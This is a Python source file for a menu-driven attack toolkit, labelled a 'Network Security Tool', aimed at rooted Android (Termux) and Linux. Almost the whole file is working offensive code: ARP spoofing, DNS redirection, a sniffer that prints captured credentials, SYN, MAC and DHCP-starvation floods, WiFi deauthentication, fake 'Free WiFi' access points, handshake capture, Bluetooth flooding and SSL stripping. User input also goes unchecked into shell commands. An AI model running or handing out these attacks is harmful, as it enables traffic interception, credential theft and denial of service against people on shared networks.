import os
import sys
import platform
from colorama import Fore, init
import subprocess
import netifaces
import scapy.all as scapy
from scapy.layers import http
import time
from scapy.layers.dns import DNSQR, DNSRR, DNS
from scapy.layers.l2 import ARP
from scapy.layers.inet import IP, UDP
import random
import netfilterqueue

def check_platform():
    if platform.system() == "Windows":
        return "Windows"
    elif os.path.exists("/data/data/com.termux"):
        return "Termux"
    else:
        return "Linux"

def check_root():
    if check_platform() != "Windows" and os.geteuid() != 0:
        print(f"{Fore.RED}[!] This script needs root privileges{Fore.RESET}")
        sys.exit(1)

def arp_spoof(target_ip, gateway_ip):
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        
        while True:
            # Spoof target
            spoof_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            scapy.send(spoof_packet, verbose=False)
            
            # Spoof gateway
            spoof_packet = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
            scapy.send(spoof_packet, verbose=False)
            
            print(f"\r{Fore.GREEN}[+] Packets sent{Fore.RESET}", end="")
            time.sleep(2)
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Restoring ARP tables...{Fore.RESET}")
        restore_arp(target_ip, gateway_ip, target_mac, gateway_mac)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def restore_arp(target_ip, gateway_ip, target_mac, gateway_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(packet, count=4, verbose=False)

def main():
    init()
    platform_type = check_platform()
    
    while True:
        print(f"\n{Fore.GREEN}=== Network Security Tool ==={Fore.RESET}")
        print(f"{Fore.YELLOW}[1] Network Attacks")
        print(f"[2] WiFi Attacks")
        print(f"[3] Bluetooth Attacks")
        print(f"[4] Exit{Fore.RESET}")
        
        choice = input(f"\n{Fore.CYAN}Select option: {Fore.RESET}")
        
        if choice == "1":
            if platform_type == "Termux":
                network_attacks_termux()
            else:
                network_attacks_windows()
        elif choice == "2":
            wifi_attacks()
        elif choice == "3":
            bluetooth_attacks()
        elif choice == "4":
            break
        else:
            print(f"{Fore.RED}[-] Invalid option{Fore.RESET}")

def network_attacks_termux():
    print(f"\n{Fore.GREEN}=== Network Attacks (Termux) ==={Fore.RESET}")
    print(f"{Fore.YELLOW}[1] ARP Spoof")
    print(f"[2] Network Scanner")
    print(f"[3] DNS Spoof")
    print(f"[4] MITM Sniffer")
    print(f"[5] TCP SYN Flood")
    print(f"[6] Port Scanner")
    print(f"[7] MAC Flood")
    print(f"[8] DHCP Starvation")
    print(f"[9] Back{Fore.RESET}")
    
    choice = input(f"\n{Fore.CYAN}Select attack: {Fore.RESET}")
    
    if choice == "1":
        target = input(f"{Fore.CYAN}Enter target IP: {Fore.RESET}")
        gateway = input(f"{Fore.CYAN}Enter gateway IP: {Fore.RESET}")
        arp_spoof(target, gateway)
    elif choice == "2":
        target = input(f"{Fore.CYAN}Enter IP range (e.g. 192.168.1.0/24): {Fore.RESET}")
        network_scan(target)
    elif choice == "3":
        target = input(f"{Fore.CYAN}Enter target IP: {Fore.RESET}")
        fake_dns = input(f"{Fore.CYAN}Enter fake DNS (e.g. 8.8.8.8): {Fore.RESET}")
        dns_spoof(target, fake_dns)
    elif choice == "4":
        interface = input(f"{Fore.CYAN}Enter interface (e.g. wlan0): {Fore.RESET}")
        mitm_sniffer(interface)
    elif choice == "5":
        target = input(f"{Fore.CYAN}Enter target IP: {Fore.RESET}")
        port = input(f"{Fore.CYAN}Enter target port: {Fore.RESET}")
        syn_flood(target, int(port))
    elif choice == "6":
        target = input(f"{Fore.CYAN}Enter target IP: {Fore.RESET}")
        port_scanner(target)
    elif choice == "7":
        interface = input(f"{Fore.CYAN}Enter interface (e.g. wlan0): {Fore.RESET}")
        mac_flood(interface)
    elif choice == "8":
        interface = input(f"{Fore.CYAN}Enter interface (e.g. wlan0): {Fore.RESET}")
        dhcp_starvation(interface)
    elif choice == "9":
        return
    else:
        print(f"{Fore.RED}[-] Invalid option{Fore.RESET}")

def network_attacks_windows():
    print(f"\n{Fore.GREEN}=== Network Attacks (Windows) ==={Fore.RESET}")
    print(f"{Fore.YELLOW}[1] Network Scanner")
    print(f"[2] Back{Fore.RESET}")
    
    choice = input(f"\n{Fore.CYAN}Select attack: {Fore.RESET}")
    
    if choice == "1":
        target = input(f"{Fore.CYAN}Enter IP range (e.g. 192.168.1.0/24): {Fore.RESET}")
        network_scan(target)
    elif choice == "2":
        return
    else:
        print(f"{Fore.RED}[-] Invalid option{Fore.RESET}")

def network_scan(ip_range):
    print(f"{Fore.GREEN}[+] Scanning network: {ip_range}{Fore.RESET}")
    try:
        # ARP scan for live hosts
        arp_request = scapy.ARP(pdst=ip_range)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        
        # Print results
        print(f"\n{Fore.GREEN}IP\t\t\tMAC Address\t\tVendor{Fore.RESET}")
        print("-" * 60)
        for element in answered_list:
            try:
                vendor = scapy.conf.manufdb._get_manuf(element[1].hwsrc)
                print(f"{element[1].psrc}\t\t{element[1].hwsrc}\t\t{vendor}")
            except:
                print(f"{element[1].psrc}\t\t{element[1].hwsrc}\t\tUnknown")
                
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {str(e)}{Fore.RESET}")

def wifi_discovery():
    if check_platform() == "Termux":
        print(f"{Fore.GREEN}[+] Scanning for WiFi networks...{Fore.RESET}")
        try:
            interface = input(f"{Fore.CYAN}Enter interface (e.g. wlan0): {Fore.RESET}")
            
            # Kill interfering processes
            os.system(f"su -c 'airmon-ng check kill'")
            os.system(f"su -c 'airmon-ng start {interface}'")
            
            print(f"\n{Fore.GREEN}=== Available Networks ==={Fore.RESET}")
            print(f"{Fore.YELLOW}BSSID\t\t\tChannel\tPower\tESSID\tEncryption{Fore.RESET}")
            
            # Two scanning options
            print(f"\n{Fore.CYAN}Select scan type:")
            print(f"1. Quick Scan (2-3 seconds)")
            print(f"2. Deep Scan (captures handshakes){Fore.RESET}")
            scan_type = input(f"\nChoice: ")
            
            if scan_type == "1":
                os.system(f"su -c 'airodump-ng {interface}mon --output-format csv -w /sdcard/wifi_scan'")
                time.sleep(3)  # Quick scan
            else:
                print(f"{Fore.YELLOW}[*] Scanning and capturing handshakes. Press Ctrl+C to stop...{Fore.RESET}")
                os.system(f"su -c 'airodump-ng {interface}mon -w /sdcard/wifi_scan --output-format pcap,csv'")
            
            # Parse and display results
            if os.path.exists("/sdcard/wifi_scan-01.csv"):
                with open("/sdcard/wifi_scan-01.csv", "r") as f:
                    networks = f.readlines()
                    for line in networks[2:]:  # Skip header lines
                        if line.strip():
                            data = line.split(",")
                            if len(data) >= 14:  # Valid network line
                                bssid = data[0].strip()
                                channel = data[3].strip()
                                power = data[8].strip()
                                essid = data[13].strip()
                                encryption = data[5].strip()
                                print(f"{bssid}\t{channel}\t{power}dBm\t{essid}\t{encryption}")
            
            # Cleanup
            os.system("rm /sdcard/wifi_scan-01.*")
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Stopping scan...{Fore.RESET}")
        finally:
            os.system(f"su -c 'airmon-ng stop {interface}mon'")
    else:
        print(f"{Fore.RED}[!] Feature not implemented for this platform{Fore.RESET}")

def wifi_attacks():
    if check_platform() == "Termux" and not (os.path.exists("/system/xbin/su") or os.path.exists("/system/bin/su")):
        print(f"{Fore.RED}[!] Root access required for WiFi attacks{Fore.RESET}")
        return
        
    print(f"\n{Fore.GREEN}=== WiFi Attacks ==={Fore.RESET}")
    print(f"{Fore.YELLOW}[1] Discover Networks")
    print(f"[2] Create Fake Access Points")
    print(f"[3] Deauth Attack")
    print(f"[4] Monitor Mode")
    print(f"[5] Capture Handshakes")
    print(f"[6] Create Multiple Access Points")
    print(f"[7] Back{Fore.RESET}")
    
    choice = input(f"\n{Fore.CYAN}Select attack: {Fore.RESET}")
    
    if choice == "1":
        wifi_discovery()
    elif choice == "2":
        ssid = input(f"{Fore.CYAN}Enter SSID name: {Fore.RESET}")
        channel = input(f"{Fore.CYAN}Enter channel (1-11): {Fore.RESET}")
        create_fake_ap(ssid, channel)
    elif choice == "3":
        interface = input(f"{Fore.CYAN}Enter interface (e.g., wlan0): {Fore.RESET}")
        target_mac = input(f"{Fore.CYAN}Enter target MAC: {Fore.RESET}")
        deauth_attack(interface, target_mac)
    elif choice == "4":
        interface = input(f"{Fore.CYAN}Enter interface (e.g., wlan0): {Fore.RESET}")
        enable_monitor_mode(interface)
    elif choice == "5":
        interface = input(f"{Fore.CYAN}Enter interface (e.g., wlan0): {Fore.RESET}")
        capture_handshakes(interface)
    elif choice == "6":
        interface = input(f"{Fore.CYAN}Enter interface (e.g., wlan0): {Fore.RESET}")
        create_multiple_aps(interface)
    elif choice == "7":
        return
    else:
        print(f"{Fore.RED}[-] Invalid option{Fore.RESET}")

def create_fake_ap(ssid, channel):
    if check_platform() == "Termux":
        try:
            os.system(f"su -c 'airbase-ng -e {ssid} -c {channel} wlan0'")
        except KeyboardInterrupt:
            os.system("su -c 'airmon-ng stop wlan0'")
    else:
        print(f"{Fore.RED}[!] Feature not implemented for this platform{Fore.RESET}")

def deauth_attack(interface, target_mac):
    if check_platform() == "Termux":
        try:
            os.system(f"su -c 'aireplay-ng --deauth 0 -a {target_mac} {interface}'")
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}[*] Stopping deauth attack...{Fore.RESET}")
    else:
        print(f"{Fore.RED}[!] Feature not implemented for this platform{Fore.RESET}")

def enable_monitor_mode(interface):
    if check_platform() == "Termux":
        os.system(f"su -c 'airmon-ng check kill'")
        os.system(f"su -c 'airmon-ng start {interface}'")
        print(f"{Fore.GREEN}[+] Monitor mode enabled on {interface}mon{Fore.RESET}")
    else:
        print(f"{Fore.RED}[!] Feature not implemented for this platform{Fore.RESET}")

def capture_handshakes(interface):
    if check_platform() == "Termux":
        try:
            os.system(f"su -c 'airodump-ng {interface}mon -w capture'")
        except KeyboardInterrupt:
            print(f"{Fore.GREEN}[+] Handshake capture stopped. Check capture files.{Fore.RESET}")
    else:
        print(f"{Fore.RED}[!] Feature not implemented for this platform{Fore.RESET}")

def create_multiple_aps(interface):
    try:
        print(f"{Fore.GREEN}[+] Starting AP using Android system...{Fore.RESET}")
        
        # Enable tethering using Android settings
        os.system("su -c 'settings put global tether_dun_required 0'")
        os.system("su -c 'svc wifi enable'")
        time.sleep(1)
        
        # Configure and start hotspot
        os.system("su -c 'settings put global wifi_hotspot_ssid \"Free WiFi\"'")
        os.system("su -c 'settings put global wifi_hotspot_password \"12345678\"'")
        os.system("su -c 'svc wifi enable'")
        os.system("su -c 'settings put global wifi_hotspot_enabled 1'")
        
        print(f"{Fore.GREEN}[+] AP Created! SSID: Free WiFi, Password: 12345678{Fore.RESET}")
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Cleaning up...{Fore.RESET}")
        os.system("su -c 'settings put global wifi_hotspot_enabled 0'")

def bluetooth_attacks():
    if not os.path.exists("/system/xbin/su") and not os.path.exists("/system/bin/su"):
        print(f"{Fore.RED}[!] Root access required for Bluetooth attacks{Fore.RESET}")
        return
        
    print(f"\n{Fore.GREEN}=== Bluetooth Attacks ==={Fore.RESET}")
    print(f"{Fore.YELLOW}[1] Bluetooth Scanner")
    print(f"[2] Bluetooth DOS")
    print(f"[3] Spam Pairing")
    print(f"[4] Back{Fore.RESET}")
    
    choice = input(f"\n{Fore.CYAN}Select attack: {Fore.RESET}")
    
    if choice == "1":
        os.system("su -c 'hciconfig hci0 up'")
        os.system("su -c 'hcitool scan'")
    elif choice == "2":
        target = input(f"{Fore.CYAN}Enter target MAC (e.g., XX:XX:XX:XX:XX:XX): {Fore.RESET}")
        os.system(f"su -c 'l2ping -f {target}'")
    elif choice == "3":
        target = input(f"{Fore.CYAN}Enter target MAC: {Fore.RESET}")
        while True:
            try:
                os.system(f"su -c 'hcitool cc {target}'")
                time.sleep(1)
            except KeyboardInterrupt:
                break
    elif choice == "4":
        return
    else:
        print(f"{Fore.RED}[-] Invalid option{Fore.RESET}")

def bluetooth_scan():
    if check_platform() == "Termux":
        print(f"{Fore.RED}[!] Install bluetooth tools:{Fore.RESET}")
        print("pkg install root-repo && pkg install bluetoothctl")
    else:
        print(f"{Fore.RED}[!] Feature not implemented for this platform{Fore.RESET}")

def bluetooth_spam(target_mac):
    if check_platform() == "Termux":
        print(f"{Fore.RED}[!] Install bluetooth tools:{Fore.RESET}")
        print("pkg install root-repo && pkg install bluetoothctl")
    else:
        print(f"{Fore.RED}[!] Feature not implemented for this platform{Fore.RESET}")

def dns_spoof(target_ip, fake_dns):
    try:
        print(f"{Fore.GREEN}[+] Starting DNS Spoofing...{Fore.RESET}")
        
        # Enable IP forwarding
        os.system("su -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'")
        
        # Setup iptables
        os.system("su -c 'iptables -F'")
        os.system("su -c 'iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination " + fake_dns + "'")
        
        print(f"{Fore.GREEN}[+] DNS traffic redirected to {fake_dns}{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop...{Fore.RESET}")
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Stopping DNS Spoof...{Fore.RESET}")
        os.system("su -c 'iptables -F'")
        os.system("su -c 'iptables -t nat -F'")

def mitm_sniffer(interface):
    try:
        print(f"{Fore.GREEN}[+] Starting MITM sniffing on {interface}...{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Capturing: HTTP, FTP, Telnet, SSH traffic{Fore.RESET}")
        
        def packet_callback(packet):
            if packet.haslayer(http.HTTPRequest):
                url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
                print(f"{Fore.GREEN}[+] HTTP Request >> {url}{Fore.RESET}")
                
                if packet.haslayer(scapy.Raw):
                    load = packet[scapy.Raw].load.decode()
                    keywords = ['username', 'user', 'password', 'pass', 'login']
                    for keyword in keywords:
                        if keyword in load.lower():
                            print(f"{Fore.RED}[!] Possible credentials >> {load}{Fore.RESET}")
        
        scapy.sniff(iface=interface, store=False, prn=packet_callback)
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Stopping sniffer{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {str(e)}{Fore.RESET}")

def syn_flood(target_ip, port):
    try:
        print(f"{Fore.GREEN}[+] Starting SYN flood on {target_ip}:{port}{Fore.RESET}")
        
        while True:
            source_port = scapy.RandShort()
            seq_num = scapy.RandInt()
            
            # Craft SYN packet
            IP_layer = scapy.IP(dst=target_ip)
            TCP_layer = scapy.TCP(sport=source_port, dport=port, flags="S", seq=seq_num)
            packet = IP_layer/TCP_layer
            
            scapy.send(packet, verbose=False)
            print(f"\r{Fore.GREEN}[+] Packets sent: {seq_num}", end="")
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Stopping SYN flood{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {str(e)}{Fore.RESET}")

def ssl_strip(interface):
    try:
        print(f"{Fore.GREEN}[+] Starting SSL Strip on {interface}...{Fore.RESET}")
        os.system(f"su -c 'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000'")
        os.system(f"su -c 'sslstrip -l 10000 -w sslstrip.log'")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Stopping SSL Strip...{Fore.RESET}")
        os.system("su -c 'iptables -t nat -F'")

def packet_capture(interface):
    try:
        print(f"{Fore.GREEN}[+] Starting packet capture on {interface}...{Fore.RESET}")
        os.system(f"su -c 'tcpdump -i {interface} -w capture.pcap -v'")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Capture saved to capture.pcap{Fore.RESET}")

def port_scanner(target_ip):
    try:
        print(f"{Fore.GREEN}[+] Starting port scan on {target_ip}{Fore.RESET}")
        common_ports = [21,22,23,25,53,80,443,445,8080,8443]
        
        for port in common_ports:
            packet = scapy.IP(dst=target_ip)/scapy.TCP(dport=port, flags="S")
            response = scapy.sr1(packet, timeout=1, verbose=False)
            
            if response and response.haslayer(scapy.TCP):
                if response[scapy.TCP].flags == 0x12: # SYN-ACK
                    print(f"{Fore.GREEN}[+] Port {port} is open{Fore.RESET}")
                    # Send RST to close connection
                    rst = scapy.IP(dst=target_ip)/scapy.TCP(dport=port, flags="R")
                    scapy.send(rst, verbose=False)
                    
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Stopping port scan...{Fore.RESET}")

def mac_flood(interface):
    try:
        print(f"{Fore.GREEN}[+] Starting MAC flood on {interface}{Fore.RESET}")
        
        while True:
            # Generate random MAC
            src_mac = scapy.RandMAC()
            dst_mac = scapy.RandMAC()
            
            # Create packet
            packet = scapy.Ether(src=src_mac, dst=dst_mac)/scapy.ARP()
            scapy.sendp(packet, iface=interface, verbose=False)
            print(f"\r{Fore.GREEN}[+] Flooding network with MAC addresses{Fore.RESET}", end="")
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Stopping MAC flood{Fore.RESET}")

def dhcp_starvation(interface):
    try:
        print(f"{Fore.GREEN}[+] Starting DHCP starvation on {interface}{Fore.RESET}")
        
        while True:
            # Generate random MAC
            mac = scapy.RandMAC()
            
            # Create DHCP discover packet
            dhcp_discover = (scapy.Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/
                           scapy.IP(src="0.0.0.0", dst="255.255.255.255")/
                           scapy.UDP(sport=68, dport=67)/
                           scapy.BOOTP(chaddr=mac)/
                           scapy.DHCP(options=[("message-type","discover"),"end"]))
            
            scapy.sendp(dhcp_discover, iface=interface, verbose=False)
            print(f"\r{Fore.GREEN}[+] DHCP requests sent{Fore.RESET}", end="")
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Stopping DHCP starvation{Fore.RESET}")

if __name__ == "__main__":
    main()
